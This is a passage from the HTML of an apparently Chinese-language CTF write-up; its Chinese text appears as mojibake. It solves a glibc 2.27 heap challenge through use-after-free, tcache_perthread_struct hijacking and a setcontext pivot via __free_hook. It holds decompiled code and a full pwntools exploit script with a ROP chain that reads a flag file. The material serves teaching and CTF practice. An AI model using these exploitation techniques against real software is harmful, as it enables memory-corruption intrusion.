class="section">[rdi+0x68]</span></span><br><span class="line">0x7ffff7a340cd &lt;setcontext+125&gt;:xor    eax,eax</span><br><span class="line">0x7ffff7a340cf &lt;setcontext+127&gt;:ret    </span><br></pre></td></tr></table></figure><p>è€Œrdiæ˜¯ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°†setcontext+53æ”¾å…¥<code>_malloc_hook</code>æˆ–è€…<code>_free_hook</code>ï¼Œmallocæˆ–freeä¸€ä¸ªå †å—ï¼Œæ­¤æ—¶rdiä¾¿æ˜¯å †å—çš„å†…å®¹æŒ‡é’ˆï¼Œå› æ­¤åªè¦æå‰åœ¨å †å—é‡Œå¸ƒç½®å¯¹åº”çš„å¯„å­˜å™¨å€¼ï¼Œå°±å¯ä»¥æ§åˆ¶åŸºæœ¬æ‰€æœ‰å¯„å­˜å™¨çš„å€¼ï¼Œè¿˜å¯ä»¥pushä¸€ä¸ªå€¼</p><h2 id="é™æ€åˆ†æ"><a href="#é™æ€åˆ†æ" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3[<span class="number">5</span>]; <span class="comment">// [rsp+0h] [rbp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init_0();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. allocate&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. edit&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3. show&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4. delete&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5. exit&quot;</span>);</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Your choice: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, v3);</span><br><span class="line">    <span class="keyword">switch</span> ( v3[<span class="number">0</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1LL</span>:</span><br><span class="line">        add();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2LL</span>:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3LL</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4LL</span>:</span><br><span class="line">        delete();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5LL</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Unknown&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¸¸è§çš„èœå•å †é¢˜</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">void</span> *v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;size);                 <span class="comment">// =0</span></span><br><span class="line">  <span class="keyword">if</span> ( !size )</span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;size);</span><br><span class="line">    v1 = size;</span><br><span class="line">    <span class="keyword">if</span> ( size &gt; <span class="number">0x78</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Too large&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = <span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="keyword">if</span> ( v2 )</span><br><span class="line">      &#123;</span><br><span class="line">        global_size = v1;</span><br><span class="line">        malloc_ptr_0 = v2;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;allocate failed&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­size&lt;&#x3D;0x78ï¼ŒåŒæ—¶åªèƒ½åŒæ—¶åœ¨å†…å­˜å­˜åœ¨ä¸€ä¸ªmallocå†…å­˜åœ°å€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> *v1; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+0h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v3);</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( malloc_ptr_0 )</span><br><span class="line">    &#123;</span><br><span class="line">      __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">      v0 = malloc_ptr_0;</span><br><span class="line">      <span class="keyword">if</span> ( global_size )</span><br><span class="line">      &#123;</span><br><span class="line">        v1 = (<span class="type">char</span> *)malloc_ptr_0 + global_size;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          read(<span class="number">0</span>, v0, <span class="number">1uLL</span>);</span><br><span class="line">          <span class="keyword">if</span> ( *v0 == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">if</span> ( ++v0 == v1 )</span><br><span class="line">            <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">        &#125;</span><br><span class="line">        *v0 = <span class="number">0</span>;                                <span class="comment">// off-by-null</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåº”è¯¥æ˜¯æœ‰ä¸€ä¸ªoff-by-oneçš„ï¼Œä½†æ˜¯æ²¡æœ‰ç”¨ä¸Š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( !v1 &amp;&amp; malloc_ptr_0 )</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Content: %s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)malloc_ptr_0);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>èƒ½æ³„éœ²</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( !v1 &amp;&amp; malloc_ptr_0 )</span><br><span class="line">    <span class="built_in">free</span>(malloc_ptr_0);                         <span class="comment">// uaf</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ˜¾ç„¶uaf</p><p>é¦–å…ˆåˆ†ä¸ºä¸‰æ­¥</p><h2 id="ä¸€ï¼šæ³„éœ²heapåŸºå€"><a href="#ä¸€ï¼šæ³„éœ²heapåŸºå€" class="headerlink" title="ä¸€ï¼šæ³„éœ²heapåŸºå€"></a>ä¸€ï¼šæ³„éœ²heapåŸºå€</h2><p>â€‹å› ä¸ºæœ¬é¢˜æœ‰ä¸€ä¸ªæ²™ç®±ï¼Œè€Œè¯¥æ²™ç®±æ˜¯é€šè¿‡å¤§é‡çš„å †æ¥å®ç°çš„ï¼Œå› æ­¤å†…å­˜ä¸­æœ¬èº«å°±å­˜åœ¨å¤§é‡çš„heap</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202406191258827.png" alt="image-20240515234643361"></p><p>å› æ­¤åªè¦ç”³è¯·å¹¶é‡Šæ”¾ä¸€ä¸ª0x78å°±å¯ä»¥æ³„éœ²heapåŸºå€</p><h2 id="äºŒï¼šæ³„éœ²libcåŸºå€"><a href="#äºŒï¼šæ³„éœ²libcåŸºå€" class="headerlink" title="äºŒï¼šæ³„éœ²libcåŸºå€"></a>äºŒï¼šæ³„éœ²libcåŸºå€</h2><p>è¿™é¢˜æ³„éœ²libcåŸºå€ååˆ†å·§å¦™ï¼Œå®ƒé¦–å…ˆæ˜¯é€šè¿‡å°†ä¸‹ä¸€ä¸ªheapç”³è¯·åˆ°tcache_perthread_structç»“æ„ä½“ä¸Šï¼Œå› ä¸ºè¯¥ç»“æ„ä½“æ˜¯0x250å¤§å°çš„ï¼Œè€Œtcacheä¹ŸåŒ…å«äº†è¿™ä¸ªå¤§å°ï¼Œå› æ­¤åŠ«æŒè¿™ä¸ªç»“æ„ä½“ï¼Œå°†è¯¥0x250å¤§å°çš„heapçš„æ•°é‡æ‹‰æ»¡ï¼Œè¿™æ ·å†æ¬¡é‡Šæ”¾å°±å°†æœ¬heapé‡Šæ”¾åˆ°unsortedbiné‡Œï¼Œå†showä¸€ä¸‹å°±æœ‰libcåŸºå€äº†</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202406191258828.png" alt="image-20240515235042186"></p><h2 id="ä¸‰ï¼šåŠ«æŒsetcontext"><a href="#ä¸‰ï¼šåŠ«æŒsetcontext" class="headerlink" title="ä¸‰ï¼šåŠ«æŒsetcontext"></a>ä¸‰ï¼šåŠ«æŒsetcontext</h2><p>é¦–å…ˆæˆ‘ä»¬è¦å…ˆäº†è§£tcache_perthread_structç»“æ„ä½“ï¼Œå®ƒä¸Šé¢å…ˆæ˜¯å¤§å°ï¼Œå†æ˜¯æ¯ä¸ªtcachebinçš„åŸºå€ï¼Œå¦‚æœå¤§å°æ˜¯0ï¼Œé‚£ä¹ˆç»“æ„ä½“ä¸Šçš„æ¯ä¸ªtcacheçš„åœ°å€å°±æ˜¯ä¸‹ä¸€æ¬¡ç”³è¯·heapçš„åœ°å€ï¼ˆåŒæ—¶ä¹Ÿæ˜¯å†™çš„åœ°å€ï¼‰</p><p>å› æ­¤æˆ‘ä»¬æ„é€ ä¸¤ä¸ª</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">orw1=heap_base+<span class="number">0x3000</span></span><br><span class="line">orw2=heap_base+<span class="number">0x3060</span></span><br><span class="line">stack1=heap_base+<span class="number">0x2000</span></span><br><span class="line">stack2=heap_base+<span class="number">0x20A0</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥å°†orwä¸Šå¡«å……æ»¡orwshellçš„ropé“¾ï¼Œç„¶åç”¨stack1ä¸Šçš„tcacheæ¥ä½œä¸ºfreeçš„å‚æ•°ï¼Œstack2ä¸Šä¾¿æ˜¯orwçš„åœ°å€ï¼ˆè¦å†åŠ ä¸Šä¸€ä¸ªretï¼Œå› ä¸ºsetcontextæå®Œmovä¹‹åä¾¿æ˜¯retï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">path=<span class="string">&#x27;./silverwolf&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">amd64shell=<span class="string">b&quot;RRYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXAA&quot;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :info(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>====&gt;<span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28486</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p,duan)</span><br><span class="line">            pause()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size=<span class="built_in">int</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index: &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Size: &#x27;</span>,tbs(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content=<span class="built_in">bytearray</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index: &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index: &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice: &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index: &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#step1 heap_base</span></span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">delete()</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">heap_base=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x11b0</span></span><br><span class="line">leak(<span class="string">&quot;heap_base&quot;</span>,heap_base)</span><br><span class="line">debug()</span><br><span class="line"><span class="comment">#step2 libc_base</span></span><br><span class="line">edit(p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">edit(p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x0000000007000000</span>))</span><br><span class="line">delete()</span><br><span class="line">show()</span><br><span class="line">debug()</span><br><span class="line">ru(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">libc_base=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3EBCA0</span></span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">debug()</span><br><span class="line">edit(p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x0000000000000000</span>))</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="comment">#step3 SROP</span></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">pop_rdi = libc_base + <span class="number">0x215BF</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x43AE8</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x23EEA</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x1B96</span></span><br><span class="line">read = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span></span><br><span class="line">syscall = libc_base + <span class="number">0xE5965</span></span><br><span class="line">flag_addr = heap_base + <span class="number">0x1000</span></span><br><span class="line">ret = libc_base + <span class="number">0x8AA</span></span><br><span class="line"></span><br><span class="line">orw1=heap_base+<span class="number">0x3000</span></span><br><span class="line">orw2=heap_base+<span class="number">0x3060</span></span><br><span class="line"></span><br><span class="line">stack1=heap_base+<span class="number">0x2000</span></span><br><span class="line">stack2=heap_base+<span class="number">0x20A0</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x40</span>+p64(free_hook)  <span class="comment">#0x20</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)                      <span class="comment">#0x30</span></span><br><span class="line">payload+=p64(flag_addr)              <span class="comment">#0x40</span></span><br><span class="line">payload+=p64(stack1)                 <span class="comment">#0x50</span></span><br><span class="line">payload+=p64(stack2)                 <span class="comment">#0x60 </span></span><br><span class="line">payload+=p64(orw1)                   <span class="comment">#0x70</span></span><br><span class="line">payload+=p64(orw2)                   <span class="comment">#0x80</span></span><br><span class="line"></span><br><span class="line">edit(payload)</span><br><span class="line">debug()</span><br><span class="line">orw=p64(pop_rdi)+p64(flag_addr)+p64(pop_rax)+p64(<span class="number">2</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(syscall)</span><br><span class="line">orw+=p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(orw1)+p64(pop_rdx)+p64(<span class="number">0x30</span>)+p64(read)</span><br><span class="line">orw+=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(write)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">edit(p64(setcontext))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">edit(<span class="string">b&#x27;./flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">edit(orw[:<span class="number">0x60</span>])</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">edit(orw[<span class="number">0x60</span>:])</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x58</span>)</span><br><span class="line">edit(p64(orw1)+p64(ret))</span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜éå¸¸çš„å¦™ï¼Œè€ƒå¯Ÿäº†tcache_perthread_structç»“æ„ä½“çš„åˆ©ç”¨å’ŒsetcontextåŠ«æŒåˆ©ç”¨ï¼ˆç®—æ˜¯ä¸€ä¸ªå †æ¥æ§åˆ¶æ ˆçš„æœ‰æ•ˆæ‰‹æ®µï¼‰</p><h1 id="SUCTF-2018-æ‹›æ–°èµ›-unlink"><a href="#SUCTF-2018-æ‹›æ–°èµ›-unlink" class="headerlink" 